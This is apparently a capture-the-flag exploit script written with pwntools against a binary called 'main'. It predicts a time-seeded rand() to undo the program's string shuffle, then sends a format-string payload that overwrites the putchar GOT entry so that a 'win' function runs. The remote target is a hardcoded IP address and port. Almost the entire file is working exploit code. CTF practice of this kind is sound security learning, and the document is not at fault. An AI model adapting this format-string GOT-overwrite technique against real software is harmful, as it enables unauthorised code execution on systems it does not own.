#!usr/bin/python3
from pwn import *
from ctypes import CDLL
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
host, port = '51.161.84.3', 52530

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401648
'''.format(**locals())

def shuffleString(str):
    str = list(str)
    libc.srand(t)
    length = len(str)

    i = length - 1
    while i > 0:
        i = length - 1
        random = libc.rand()
        tmp = str[i]
        str[i] = str[random % length]
        str[random % length] = tmp
        length = i
    
    return bytes(str)

def craftPayload(original):
    shuffled = []
    shuffled.append(shuffleString(original))
    while(shuffled[-1] != original):
        shuffled.append(shuffleString(shuffled[-1]))
        
    info('original: %s', shuffled[-1])
    info('payload: %s', shuffled[-2])
        
    return shuffled[-2]
    

# =========================================================
#                         EXPLOITS
# =========================================================
# solved after CTF 
io = initialize()
t = libc.time(None)

# offset = b'AAAAAAAA.%16$lx'
# payload = craftPayload(offset)

# win 0x00401336
payload = craftPayload(f"%{0x36}c%20$hhn%{0x4013 - 0x36}c%21$ln".encode()).ljust(32, b'\x00')
payload += p64(elf.got['putchar'])
payload += p64(elf.got['putchar'] + 1)

io.sendlineafter(b'Choice:', b'1')
io.sendlineafter(b'String:', payload)

io.interactive()